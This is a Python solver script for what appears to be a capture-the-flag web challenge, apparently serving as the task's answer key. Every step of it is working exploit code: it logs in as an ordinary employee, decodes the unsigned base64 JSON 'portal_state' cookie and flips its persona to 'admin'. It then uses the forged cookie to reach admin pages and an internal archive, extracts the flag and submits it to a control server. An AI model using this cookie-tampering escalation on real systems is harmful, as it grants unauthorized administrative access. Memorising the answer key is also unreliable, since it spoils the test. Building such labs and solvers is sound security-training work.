from __future__ import annotations

import argparse
import base64
import json
import re
from urllib.parse import urlsplit

import requests


FLAG_RE = re.compile(r"flag\{[^}]+\}")


def decode_cookie(value: str) -> dict[str, str]:
    padded = value + "=" * (-len(value) % 4)
    result = json.loads(base64.urlsafe_b64decode(padded).decode())
    if not isinstance(result, dict):
        raise RuntimeError("portal state was not an object")
    return result


def encode_cookie(value: dict[str, str]) -> str:
    raw = json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    root = target_url.rstrip("/")
    client.get(root + "/", timeout=10).raise_for_status()
    client.post(root + "/login", data={"username": "employee", "password": "employee-pass"}, timeout=10).raise_for_status()
    client.get(root + "/projects", timeout=10).raise_for_status()
    client.get(root + "/approvals", timeout=10).raise_for_status()
    normal = client.get(root + "/api/approvals/queue", timeout=10)
    normal.raise_for_status()
    if normal.json().get("role") != "employee":
        raise RuntimeError("normal employee baseline was not observed")

    client.post(root + "/settings/workspace", data={"workspace": "leadership"}, timeout=10).raise_for_status()
    raw_state = client.cookies.get("portal_state")
    if not raw_state:
        raise RuntimeError("workspace change did not return portal state")
    state = decode_cookie(raw_state)
    if state.get("persona") == "admin":
        raise RuntimeError("normal workspace response already had a privileged persona")
    state["persona"] = "admin"
    host = urlsplit(root).hostname
    if host:
        client.cookies.clear(domain=host, path="/", name="portal_state")
        client.cookies.set("portal_state", encode_cookie(state), domain=host, path="/")
    else:
        client.cookies.update({"portal_state": encode_cookie(state)})

    privileged = client.get(root + "/api/approvals/queue", timeout=10)
    privileged.raise_for_status()
    if privileged.json().get("role") != "admin":
        raise RuntimeError("modified portal context did not reach admin queue")
    review = client.get(root + "/admin/reviews", timeout=10)
    review.raise_for_status()
    archive = re.search(r"href=['\"](/internal/archive/[^'\"]+)", review.text)
    if not archive:
        raise RuntimeError("privileged review page did not disclose archive link")
    report = client.get(root + archive.group(1), timeout=10)
    report.raise_for_status()
    match = FLAG_RE.search(report.text)
    if not match:
        raise RuntimeError("internal archive did not contain a flag")
    flag = match.group(0)

    if control_url and instance_id:
        submitted = requests.post(
            control_url.rstrip("/") + f"/api/v1/instances/{instance_id}/submit",
            json={"flag": flag}, timeout=10,
        )
        submitted.raise_for_status()
        if not submitted.json().get("data", {}).get("correct"):
            raise RuntimeError("backend rejected the discovered flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target_url")
    parser.add_argument("--control-url")
    parser.add_argument("--instance-id")
    args = parser.parse_args()
    if bool(args.control_url) != bool(args.instance_id):
        parser.error("--control-url and --instance-id must be provided together")
    print(solve(args.target_url, args.control_url, args.instance_id))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
